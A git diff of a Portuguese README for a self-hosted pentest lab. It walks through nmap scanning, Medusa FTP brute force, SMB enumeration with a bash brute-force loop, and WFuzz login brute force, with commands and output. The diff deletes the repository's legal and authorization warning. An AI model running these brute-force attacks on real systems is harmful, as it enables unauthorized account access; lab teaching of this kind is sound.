@@ -5,13 +5,6 @@ Projeto mini-lab para demonstrar um fluxo completo de reconhecimento e ataques d
 
 ---
 
-## Avisos importantes / Legal
-- Este repositório é **apenas para fins educacionais** e deve ser usado **somente** em ambientes controlados e autorizados (seu próprio laboratório).  
-- Executar brute-force contra sistemas sem autorização é ilegal e antiético.
-- Tenha cuidado ao publicar wordlists, senhas ou logs. Remova credenciais antes de commitar.
-
----
-
 ## Ambiente usado
 - Atacante: Kali Linux (WSL)
 - Alvo: openSUSE (WSL)
@@ -87,11 +80,15 @@ sudo systemctl restart smb nmb vsftpd
 sudo systemctl status smb nmb vsftpd
 ```
 ## Reconhecimento inicial (exemplo)
-Nesta etapa a ideia é identificar possíveis pontos de entrada.
-utilizando o nmap para mapear portas abertas uma ferramenta muito boa para este tipo de mapeamento 
+Nesta etapa buscamos identificar possíveis pontos de entrada no alvo. Começamos com mapeamento de portas e serviços usando nmap.
+uma ferramenta robusta para descoberta de hosts, detecção de serviços e versões, além de identificação de possíveis superfícies de ataque
 
+> Para mais informações sobre a ferramenta consulte https://nmap.org/
+> 
+> [explain command](https://explainshell.com/explain?cmd=nmap+172.25.223.247+-v)
 ```bash
 # nmap 172.25.223.247
+
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 17:05 -03
 Nmap scan report for 172.25.223.247
 Host is up (0.0000050s latency).
@@ -104,9 +101,11 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 0.16 seconds
 ```
-[explain command](https://explainshell.com/explain?cmd=nmap+172.25.223.247+-v)
+## Nmap com mais recuros
+> [explain command](https://explainshell.com/explain?cmd=nmap+172.25.223.247+-sC)
 ```bash
 # nmap 172.25.223.247 -sC
+
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-15 17:07 -03
 Nmap scan report for 172.25.223.247
 Host is up (0.0000050s latency).
@@ -124,7 +123,7 @@ PORT     STATE SERVICE
 |_http-open-proxy: Proxy might be redirecting requests
 
 Host script results:
-|_nbstat: NetBIOS name: NOTE-TI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_nbstat: NetBIOS name: PC-NAME, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 | smb2-time:
 |   date: 2025-10-15T20:07:44
 |_  start_date: N/A
@@ -134,26 +133,34 @@ Host script results:
 
 Nmap done: 1 IP address (1 host up) scanned in 28.75 seconds
 ```
-[explain command](https://explainshell.com/explain?cmd=nmap+172.25.223.247+-sC)
+
 com isso identificamos algumas portas junto com os serviços que estão rodando.
+tambem é possivel identificarmos que smbv2 e smbv3 estão rodando na porta 445 junto tbm com o nome do pc
 
 ## Brute-force FTP (exemplo com Medusa)
 neste caso o nosso alvo é vulnerável a um ataque de brute force então utilizaremos a ferramenta medusa para brute force em FTP,SMB e WEB 
-caso ainda não tenha instalado pode usar o comando apt install medusa ou utilize o gerenciador de pacotes da sua distribuição 
+caso ainda não tenha instalado pode usar o comando apt install medusa ou utilize o gerenciador de pacotes da sua distribuição
+
+### Aqui estamos utiliozando uma wordlista criada por mim bem pequena mas deve utilizar worslists para cada tipo de situação como recomendação fica o github da seclist que contem diversas wordlists 
+- [SecList](https://github.com/danielmiessler/SecLists) 
 # Instalar:
 ```bash
 sudo apt install medusa
 ```
+
+
+# executando medusa
 ```bash
 medusa -h 172.25.223.247 -U lists/users.txt -P lists/passwords.txt -M ftp -f
 ```
-[explain command](https://explainshell.com/explain?cmd=medusa+-h+172.25.223.247+-U+lists%2Fusers.txt+-P+lists%2Fpasswords.txt+-M+ftp+-f)
+> [explain command](https://explainshell.com/explain?cmd=medusa+-h+172.25.223.247+-U+lists%2Fusers.txt+-P+lists%2Fpasswords.txt+-M+ftp+-f)
 ## Brute-force SMB (smbclient / script)
-quando estamos fazendo esse tipo de ataque é importante saber oq vc esta fazendo como funciona o protocolo e como se conectar até ele 
-protocolo smb é bem vulnerável se configurado de forma incorreta o lab que fizemos não tem muitas medidas de segurança ent vamos tentar fazer um primeiro teste que seria tentar se conectar ao host que já sabemos para isso utilizamos smbclient
+Numa situação como essa precisamos reunir mais informações sobre o alvo — antes de qualquer tentativa agressiva, vamos começar por algo simples: tentar uma conexão com smbclient. Às vezes essa conexão básica já revela metadados úteis (versão do serviço, compartilhamentos expostos, banners) que nos ajudam a planejar próximos passos sem causar impacto.
+
+> [explain command](https://explainshell.com/explain?cmd=smbclient+-L+172.25.223.247)
 ```bash
 # smbclient -L 172.25.223.247
-Password for [WORKGROUP\root]:
+Password for [WORKGROUP\root]:  # Digite qualquer senha 
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -161,19 +168,22 @@ Password for [WORKGROUP\root]:
         IPC$            IPC       IPC Service (LAB-SAMBA)
 SMB1 disabled -- no workgroup available
 ```
-[explain command](https://explainshell.com/explain?cmd=smbclient+-L+172.25.223.247)
-
-apenas digitamos qualquer usuário e podemos identificar que tem uma pasta compartilhada com o nome smbshare com isso já temos 2 informações importantes
-
-	- smb1 desativado
+tentando conectar podemos identificar
+	- smb1 desativado (ja identificado la no inicio com o nmap)
  	- nome da pasta de compartilhamento [smbshare]
-ent podemos tentar conectar com smbv3 e como não temos login e nem senha percebemos recebemos access denied
+Seria muito simples utilizar alguma ferramenta como o medusa que mostramos anteriormente ou derivados como hydra,metasploit.
+
+mas vamos a uma abordagem diferente.
+
+tentando conectar com smbv3 e como não temos login e nem senha percebemos recebemos access denied
 ```bash
 # smbclient //172.25.223.247/smbshare -m SMB3 -U "admin"
 Password for [WORKGROUP\admin]:
 tree connect failed: NT_STATUS_ACCESS_DENIED
 ```
-ent vamos utilizar isso para criar um script rápido e simples para fazer o brute force neste arquivo
+então vamos utilizar isso para criar um script rápido e simples para fazer o brute force neste host
+
+Usando nano smb-brute.sh para criar o arquivo 
 ```bash
 users=( "admin" "administrador" "teste" "labuser" "user" )
 
@@ -187,8 +197,12 @@ for u in "${users[@]}";do
    done
 done
 ```
-ao executar o script quando ele conseguir uma par que faz o login ele ja vai logar o smb e vc pode usar os comandos para navegar 
-
+Agora precisamos executar e para isso damos permissão de execução com comando 
+```bash
+chmod +x smb-brute.sh
+#em seguida execute com
+./smb-brute.sh
+```
 ```bash
 testando labuser - password
 session setup failed: NT_STATUS_LOGON_FAILURE
@@ -206,7 +220,7 @@ smb: \> ls
                 1055762868 blocks of size 1024. 1001491212 blocks available
 smb: \>
 ```
-ao executar o script quando conseguir credenciais validas o login e feito de forma automatica
+ao executar o script quando ele conseguir uma par que faz o login ele ja vai logar o smb e vc pode usar os comandos para navegar 
 
 
 ## Brute-force Web (WFuzz)
@@ -226,4 +240,5 @@ wfuzz -c -z file,user.txt -z file,password.txt -d "username=FUZZ&password=FUZ2Z"
 
 Para WFuzz, detecte respostas com tamanho/código diferente (ex.: redirecionamento 302 ou body length diferente).
 
-Logue saídas relevantes em arquivos e proteja esses arquivos (não comitar em repositório).
+
+
